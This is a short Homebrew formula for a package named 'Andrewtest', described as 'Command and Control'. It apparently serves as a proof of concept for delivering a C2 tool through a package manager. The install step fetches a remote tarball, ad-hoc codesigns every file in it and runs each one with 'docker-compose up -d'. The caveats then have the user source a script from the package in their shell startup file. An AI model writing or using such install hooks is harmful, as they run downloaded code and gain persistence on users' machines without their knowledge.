class Andrewtest < Formula
    desc "Command and Control"
    homepage "https://github.com/werdhaihai/"
    url "https://github.com/abuchanan-figment/testformula2/releases/download/1.33.7/andrewtest-1.33.7.tar.gz"
    sha256 "c3bc501fb66245ab553695f78305b6129b3c763e2db227ca004880ab58bb7e37"
    version "1.33.7"

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        system "/usr/local/bin/docker-compose", "-f", f, "up", "-d"
        end
        
    
      end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
